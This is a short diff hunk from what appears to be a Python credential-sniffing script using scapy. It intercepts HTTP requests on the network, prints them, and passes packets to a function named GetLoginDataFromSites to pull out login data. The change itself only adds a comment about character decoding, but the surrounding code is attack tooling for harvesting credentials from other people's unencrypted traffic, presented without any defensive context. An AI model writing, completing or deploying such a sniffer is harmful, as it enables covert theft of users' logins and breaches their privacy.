@@ -38,7 +38,7 @@ def GetLoginDataFromSites(packet):
 
 def SniffNetworkTrafic(packet):
 	if packet.haslayer(http.HTTPRequest):# Check IF This Request Is HTTP Request IF true Complete This Statment!
-		HTTPData = GetDataFromHTTP(packet).decode("UTF-8") 
+		HTTPData = GetDataFromHTTP(packet).decode("UTF-8") # Decode The Results -- Tip For You > latin1 Is So Good For Decode That Cuz Some Times UTF-8 Cuz Some Proplems
 		print("[+] HTTP REQUEST >> " + str(HTTPData)) # Tell You That There Is A Traffic On Port 80 (HTTP Port)
 
 		LoginData = GetLoginDataFromSites(packet)
